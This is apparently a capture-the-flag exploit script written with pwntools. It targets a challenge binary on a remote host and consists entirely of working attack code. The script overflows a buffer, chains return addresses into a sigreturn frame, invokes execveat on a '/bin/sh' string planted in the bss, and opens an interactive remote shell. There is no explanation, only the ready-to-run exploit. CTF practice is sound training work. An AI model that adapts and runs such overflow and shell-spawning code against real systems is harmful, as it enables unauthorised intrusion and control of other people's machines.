from pwn import *

p=remote("0.cloud.chals.io",11503)
#p=process("./862ef11b7b9c81837bed9f30bda791c440ae4ef5045bbda477cad3126c37174c")
#e=ELF("./862ef11b7b9c81837bed9f30bda791c440ae4ef5045bbda477cad3126c37174c")
e=ELF("./chall")
context.clear(arch='amd64')

def slog(name, addr): return success(': '.join([name, hex(addr)]))

#gdb.attach(p)
pause()

#eax_0=e.symbols["main"]+60
main=e.symbols["main"]
syscall=main+62
bss=e.bss()+0x100
binsh=b"/bin/sh\x00"

frame1=SigreturnFrame(kernel='amd64')
frame1.rip=syscall
frame1.rsp=syscall
#frame1.rax=0x40000000 | 0x3b  #execve
frame1.rax=0x142
frame1.rdi=0
frame1.rsi=bss
frame1.rdx=0

p.send(b'A'*0x10+p64(bss+0x10)+p64(main+28)+b'B'*0x8+p64(syscall)+bytes(frame1))
pause()
p.send(binsh+b'C'*7)
pause()

p.interactive()
